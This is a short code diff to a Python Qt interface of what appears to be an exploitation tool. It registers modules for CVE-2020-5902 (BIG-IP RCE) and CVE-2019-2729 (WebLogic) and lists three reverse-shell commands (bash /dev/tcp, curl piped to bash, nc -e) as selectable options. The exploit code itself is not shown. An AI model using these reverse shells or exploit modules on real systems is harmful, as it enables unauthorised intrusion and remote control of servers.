@@ -96,6 +96,7 @@ class BackendThread(QThread):
         :param message:获取文件url，并添加队列
         :return:无
         """
+        # url_list = [i.replace("\n", "") for i in open(self.targetTxtPath, "r").readlines()]
         with open(self.targetTxtPath, "r") as targetTxtPath:
             # 自动处理开启文件，处理之后会自动关闭，防止过量读取内容占用内存
             url_list = [i.replace("\n", "") for i in targetTxtPath.readlines()]
@@ -210,7 +211,7 @@ class MainWindow(QMainWindow, QObject):
         self.textEditinfo.connect(self.handlestatusOne)
 
     def setupFunction(self):
-        items = ["CVE_2020_5902_BIG_IP_RCE"]
+        items = ["CVE_2020_5902_BIG_IP_RCE","CVE_2019_2729_weblogic"]
         self.ui.payloadCombo.addItems(items)
         items = ["/bin/bash -i >& /dev/tcp/ip/port 0>&1", "curl ip:port | bash", "nc ip port -e /bin/bash"]
         self.ui.reboundCombo.addItems(items)
@@ -290,7 +291,7 @@ CVE_2020_5902_BIG_IP_RCE
         payload = self.ui.payloadCombo.currentText()
         module = 'rocCheckPayload.{}'.format(payload)
         importModule = importlib.import_module(module)
-        data = importModule.CVE_2020_5902_BIG_IP_RCE.runCheck(self, targetAddr, payload)
+        data = importModule.run.runCheck(self, targetAddr, payload)
         self.textEditinfo.emit('{}'.format(data['data']))
 
     # 多线程执行检测
